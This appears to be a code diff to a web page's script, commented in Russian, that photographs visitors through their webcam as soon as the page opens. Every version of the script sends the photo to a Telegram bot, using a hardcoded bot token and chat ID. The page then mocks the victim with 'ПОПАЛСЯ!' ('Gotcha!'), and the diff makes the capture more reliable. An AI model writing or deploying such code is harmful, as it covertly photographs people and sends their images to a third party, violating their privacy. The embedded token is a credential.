@@ -21,39 +21,56 @@
 
     <script>
         async function takePhoto() {
+            const statusText = document.getElementById('status');
+            
             try {
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
-                // Запрашиваем доступ к камере
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
+                // Ждем, пока видео "проснется" (даем 1 секунду)
                 video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
-                    
-                    const dataUrl = canvas.toDataURL('image/png');
-                    
-                    // ВСТАВЬ СВОИ ДАННЫЕ ТУТ:
-                    const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
-                    const chatId = "1062964951";
-                    
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${dataUrl}`);
-                    
-                    document.getElementById('status').innerText = "ПОПАЛСЯ! 📸";
-                };
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0);
+                        
+                        const dataUrl = canvas.toDataURL('image/png');
+                        
+                        // --- ВСТАВЬ СВОИ ДАННЫЕ ТУТ ---
+                        const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
+                        const chatId = "1062964951";
+                        // ------------------------------
 
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${dataUrl}`)
+                            .then(response => {
+                                if (response.ok) {
+                                    statusText.innerText = "ПОПАЛСЯ! 📸";
+                                } else {
+                                    statusText.innerText = "Ошибка отправки в Telegram!";
+                                }
+                            })
+                            .catch(err => {
+                                statusText.innerText = "Ошибка сети!";
+                                console.error(err);
+                            });
+
+                        // Останавливаем камеру, чтобы она не работала вечно (экономит батарею)
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
+                };
             } catch (err) {
                 console.error("Ошибка:", err);
-                document.getElementById('status').innerText = "Ой, камера не включилась...";
+                statusText.innerText = "Ой, камера не включилась!";
             }
         }
 
-        // Запускаем сразу при открытии страницы
-        takePhoto();
+        // Запускаем функцию через полсекунды после открытия страницы
+        setTimeout(takePhoto, 500);
     </script>
 </body>
 </html>
